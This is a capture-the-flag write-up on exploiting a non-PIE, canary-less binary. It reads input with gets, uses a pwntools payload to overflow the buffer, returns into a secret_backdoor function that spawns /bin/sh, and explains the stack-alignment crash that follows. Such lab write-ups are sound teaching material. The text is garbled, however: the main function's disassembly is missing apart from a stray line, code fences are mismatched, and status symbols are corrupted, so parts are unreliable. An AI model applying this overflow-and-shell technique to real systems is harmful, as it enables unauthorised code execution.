## Executable analysis
### checksec output
```text
        Arch:       amd64-64-little
        RELRO:      ðŸŸ¡ Partial RELRO
        Stack:      ðŸ”´ No canary found
        NX:         ðŸŸ¢ NX enabled
        PIE:        ðŸ”´ No PIE (0x400000)
        Stripped:   ðŸ”´ No
```
* as we can see, the binary is not PIE, has no canary, and the NX bit is enabled.
* this means that we know the address of all symbols in the binary, we can use ROP to execute code, but cannot run shellcode on the stack.

   0x000000000040076c <+83>:    ret
```
* the main function is pretty simple, it prints a welcome message, reads input from the user, and then prints it back.
* we can see that the input is read into a buffer on the stack, which is 32 bytes long (0x20).
* but the gets function is used to read the input, which is dangerous because it does not check the length of the input, allowing us to overflow the buffer.

```
* we can see that the binary has a function called `secret_backdoor`, which is not called anywhere in the code.
* this function is a good candidate for exploitation, as it is not protected by any security mechanisms and can be called directly.

### secret_backdoor disassembly
```asm
   0x0000000000400708 <+0>:     push   rbp
   0x0000000000400709 <+1>:     mov    rbp,rsp
   0x000000000040070c <+4>:     mov    edi,0x4007f0
   0x0000000000400711 <+9>:     call   0x4005a0 <system@plt>
   0x0000000000400716 <+14>:    nop
   0x0000000000400717 <+15>:    pop    rbp
   0x0000000000400718 <+16>:    ret
```
* the `secret_backdoor` function simply calls the `system` function with the argument `"/bin/sh"`, which will spawn a shell.
* this means that if we can call this function, we can get a shell.

### first exploit attempt
* let's try to exploit the binary by overflowing the buffer and calling the `secret_backdoor` function directly.
* we can do this by sending a payload that overflows the buffer and overwrites the return address with the address of the `secret_backdoor` function.
* the payload will look like this:
```python
io = start()

secret_backdoor = exe.sym['secret_backdoor']
payload = fit({
    40: p64(secret_backdoor)  # Call secret_backdoor
})

io.sendline(payload)
io.interactive()
```
* the out put looks like this:
```text
[+] Starting local process '/home/omri/dev/pwn-writeups/il/welcome/welcome': pid 31119

$ 
[*] Process '/home/omri/dev/pwn-writeups/il/welcome/welcome' stopped with exit code -11 (SIGSEGV) (pid 31119)
[*] Got EOF while sending in interactive
```
* we got a segmentation fault, which means that the payload is not correct.
* let's try to debug the binary and see what is going wrong.
### debugging the binary
* we can use gdb to debug the binary and see what is going wrong.
![gdb output](gdb.png)
* as we can see, the payload is not being executed correctly, and the program is crashing at movaps instruction.
* this is because the stack is not aligned correctly, and the `movaps` instruction requires the stack to be 16-byte aligned.
### Fixing the stack alignment issue
* we can fix this by moving the stack 8 bytes down before the payload, so that the stack is 16-byte aligned.
* we can do this by returning to the `main` function after the payload, which will move the stack 8 bytes down.
